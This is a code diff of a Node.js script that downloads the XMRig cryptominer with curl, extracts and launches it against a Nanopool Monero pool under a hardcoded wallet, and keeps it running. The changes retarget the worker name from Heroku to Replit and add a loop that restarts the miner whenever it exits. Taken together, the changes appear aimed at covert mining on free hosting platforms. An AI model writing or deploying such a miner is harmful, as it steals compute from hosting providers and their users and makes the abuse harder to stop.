@@ -1,6 +1,5 @@
 const { spawn, execSync } = require('child_process');
 const fs = require('fs');
-const path = require('path');
 
 const minerUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz';
 const minerTar = 'xmrig.tar.gz';
@@ -11,7 +10,7 @@ async function downloadXmrig() {
     console.log('[*] XMRig not found. Downloading...');
 
     try {
-      execSync(`wget -O ${minerTar} ${minerUrl}`);
+      execSync(`curl -L -o ${minerTar} ${minerUrl}`);
       execSync(`tar -xzf ${minerTar}`);
       execSync(`mv ${minerFolder}/xmrig ./xmrig`);
       execSync(`chmod +x ./xmrig`);
@@ -26,10 +25,10 @@ async function downloadXmrig() {
 
 async function startMining() {
   console.log('[*] Starting XMRig...');
-  
+
   const pool = 'xmr-eu1.nanopool.org:14444';
   const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
-  const workerName = 'heroku-worker';
+  const workerName = 'replit-worker';
 
   const xmrig = spawn('./xmrig', [
     '-o', pool,
@@ -50,6 +49,8 @@ async function startMining() {
 
   xmrig.on('close', (code) => {
     console.log(`xmrig process exited with code ${code}`);
+    console.log('Restarting miner in 5 seconds...');
+    setTimeout(startMining, 5000); // Auto-restart miner after crash
   });
 }
 
